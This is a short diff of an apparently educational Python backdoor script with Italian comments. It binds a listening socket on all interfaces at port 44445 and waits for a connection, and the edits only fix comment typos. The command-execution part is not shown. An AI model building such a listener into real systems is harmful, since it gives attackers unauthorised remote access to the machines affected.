@@ -2,7 +2,7 @@ import socket as so
 import subprocess
 import os
 
-# non so dove verra' esguita meglio usare tutte le schede e lo spigo con 0.0.0.0
+# non so dove verra' eseguita meglio usare tutte le schede: lo spiego con 0.0.0.0
 SRV_ADDR = "0.0.0.0"
 SRV_PORT = 44445
 
@@ -19,7 +19,7 @@ s.listen(1)
 
 print(f"Backdoor in ascolto su {SRV_PORT}")
 # Arrivati a questo punto quando do s.accept() attedera' che una connessione venga stabilita
-# accept crea una tupla, la connessione stessa e delle informazioni
+# accept crea una tupla, la connessione stessa e informazioni
 connection, address = s.accept()
 # a questo punto il programma riprende
 print("Connesso con:", address)
